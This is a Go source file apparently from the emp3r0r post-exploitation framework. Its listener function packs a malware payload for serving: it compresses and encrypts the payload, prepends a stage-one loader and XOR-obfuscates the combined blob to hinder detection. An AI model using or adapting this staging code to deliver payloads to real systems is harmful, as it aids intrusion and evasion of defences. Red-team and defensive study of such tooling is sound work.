package listener

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func xorData(data []byte, key []byte) {
	if len(key) == 0 {
		return
	}
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
}

func buildServedBlob(payloadPath string, keyStr string, loaderPath string, compression bool) ([]byte, error) {
	// ReadFileAgent handles both mem:// and disk paths
	payload, err := util.ReadFileAgent(payloadPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %v", err)
	}

	key := deriveKeyFromString(keyStr)
	var toEncrypt []byte
	if compression {
		toEncrypt = compressData(payload)
	} else {
		toEncrypt = payload
	}
	encryptedPayload := encryptData(toEncrypt, key)

	if loaderPath == "" {
		return encryptedPayload, nil
	}

	loader, err := util.ReadFileAgent(loaderPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read stage1 loader (%s): %v", loaderPath, err)
	}

	blob := make([]byte, 0, len(loader)+len(encryptedPayload))
	blob = append(blob, loader...)
	blob = append(blob, encryptedPayload...)
	xorData(blob, key)
	logging.Infof("Serving staged blob: loader=%d bytes payload=%d bytes total=%d bytes",
		len(loader), len(encryptedPayload), len(blob))
	return blob, nil
}
